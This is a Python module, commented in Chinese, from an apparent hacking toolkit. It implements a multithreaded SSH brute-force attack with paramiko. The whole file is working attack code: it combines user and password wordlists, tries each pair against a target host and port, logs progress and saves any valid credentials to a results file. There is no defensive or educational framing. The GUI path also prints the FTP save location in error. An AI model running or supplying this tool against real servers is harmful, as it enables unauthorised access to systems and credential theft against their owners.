import paramiko # 远程破解库
import queue
import threading
import time
from conf import config # 配置文件
from lib.choose import UseStyle # 设置颜色
import ttkbootstrap as ttk


GUT_output=0 # 输出到GUI
GUT_Sure=0 # 判断是否用到GUI

schedule = 0 # 记录请求多少次
count=1 # 记录文件内容一个多少行


pause=False # 破解成功用于暂程和禁止输出的


# 提取出来的结果保存起来
def Searchresults(results_IP):
    Searchresults_document = open(config.Savelocation['ssh'], 'a')  # 打开文件写的方式
    Searchresults_document.write((results_IP+'\n'))  # 写入
    Searchresults_document.close()  # 关闭文件

# 读取字典文件内容
def current_time():
    return time.strftime("[%Y-%m-%d_%H:%M:%S]: [*]", time.localtime())

# 提取用户
def Read_dictionary(user,passwd):
    global GUT_output # 输出到GUI

    global GUT_Sure # 判断是否用到GUI


    global count # 记录文件内容一个多少行

    # 叫文件内容变成
    search=queue.Queue() # 存

    for i_user in open(user, encoding="UTF-8"):
        for i_passwd in open(passwd, encoding="UTF-8"):
            diclist=i_user.rstrip()+'|'+i_passwd.rstrip()
            search.put(diclist)
    count=str(search.qsize())

    if GUT_Sure == 1:
        GUT_output.insert(ttk.END,"组成的字典数量："+count+"\n")
    else:
        print("组成的字典数量："+count)
    return search



def try_to_log_in(Thread,host,port):
    global GUT_output # 输出到GUI

    global GUT_Sure # 判断是否用到GUI


    global pause # 一共数量
    global schedule # 记录请求数量
    while not Thread.empty():
        user_passwd=Thread.get()
        user_passwd=user_passwd.split('|')

        #print(user_passwd[0]+'='+user_passwd[1])
        if pause == True:# 破解成功用于暂程和禁止输出的
            break
        else:
            try:
                # 实例化SSHClient
                ssh_client = paramiko.SSHClient()

                # 自动添加策略，保存服务器的主机名和密钥信息，如果不添加，那么不再本地know_hosts文件中记录的主机将无法连接
                ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

                # 连接
                ssh_client.connect(hostname=host, port=int(port),username=user_passwd[0],password=user_passwd[1], timeout=1)
                ssh_client.close()
                if GUT_Sure == 1:
                    GUT_output.insert(ttk.END, "*********************************\n")
                    GUT_output.insert(ttk.END, '[OK] 用户名' + user_passwd[0] +'密码'+ user_passwd[1] + "\n")
                else:
                    print(UseStyle(current_time()+'[OK] 用户名' + user_passwd[0] +'密码'+ user_passwd[1], fore='green'))
                Searchresults(f'[OK] {host}\t{str(port)}\t{user_passwd[0]}\t{user_passwd[1]}')
                pause = True  # 破解成功用于暂程和禁止输出的
                break
            except paramiko.ssh_exception.AuthenticationException:
                if pause == True:  # 破解成功用于暂程和禁止输出的
                    break
                else:
                    schedule+=1
                    if GUT_Sure == 1:
                        GUT_output.insert(ttk.END,f"密码错误进度{schedule}/{count}："+f"用户{user_passwd[0]}密码{user_passwd[1]}\n")
                    else:
                        print(UseStyle(current_time()+f"密码错误进度{schedule}/{count}：",fore='yellow')+UseStyle(f"用户{user_passwd[0]}密码{user_passwd[1]}",fore='red'))
            except paramiko.ssh_exception.NoValidConnectionsError:
                if GUT_Sure == 1:
                    GUT_output.insert(ttk.END,"目标端口没有开放\n")
                else:
                    print("目标端口没有开放")
                pause = True
            except paramiko.ssh_exception.SSHException:
                if GUT_Sure == 1:
                    GUT_output.insert(ttk.END, "线程太大了！\n")
                else:
                    print("线程太大了！")
            finally:
                ssh_client.close() # 关闭连接

def Thread(host,thread,user,document,port):
    threadpool = []

    # 提取字典
    user_passwd=Read_dictionary(user,document)

    for _ in range(int(thread)):
        Threads = threading.Thread(target=try_to_log_in, args=(user_passwd,host,port))
        threadpool.append(Threads)
    for th in threadpool:
        th.start()
    for th in threadpool:
        threading.Thread.join(th)
def Interface(args):

    host = args.ssh
    thread = args.ssht # 线程
    user = args.sshu # 用户
    document = args.sshd # 密码
    port = args.sshp # 端口

    # 判断默认
    if user == None: # 默认用户字典
        #args.user=config.Specifyablastdictionary['ssh']['admin']
        user = config.Specifyablastdictionary['ssh']['admin']

        printuser="当前使用的默认用户字典："+config.Specifyablastdictionary['ssh']['admin']
    else:
        printuser="当前使用指定用户字典文件在：" +user

    if document == None: # 默认密码字典

        document = config.Specifyablastdictionary['ssh']['passwd']
        printdocument="当前使用的默认密码字典：" + config.Specifyablastdictionary['ssh']['passwd']
    else:
        printdocument="当前使用的默认密码字典文件在：" + document


    if thread == None: # 设置默认线程
        thread = 1
        printthread="默认线程：1"
    else:
        printthread="当前指定的线程数："+str(thread)

    if port==None:
        port=22
        printport="默认端口：22"
    else:
        printport="当前指定端口"+str(port)

    print(UseStyle(f'破解成功结果保存到{config.Savelocation["ssh"]}\n{printuser}\n{printdocument}\n{printthread}\n{printport}\n\n',fore='red'))
    Thread(host,thread,user,document,port)


def gui(ip,port,thread,admin,passwd,result):
    global GUT_output # 输出到GUI

    global GUT_Sure # 判断是否用到GUI


    host=ip # ip
    port=port # 端口
    thread=thread # 线程
    user=admin # 用户
    document=passwd # 密码

    GUT_output=result # 输出到GUI

    GUT_Sure=1  # 判断是否用到GUI
    #print(thread)
    result.insert(ttk.END,f"现在扫描的是ip：{ip}\n当前指定端口：{str(port)}\n")
    result.insert(ttk.END,f"扫描的结果文件保存在：{config.Savelocation['ftp']}\n")
    result.insert(ttk.END,f"当前指定的线程数：{str(thread)}\n")
    result.insert(ttk.END,f"*********************************************\n")

    Thread(host, thread, user, document, port)

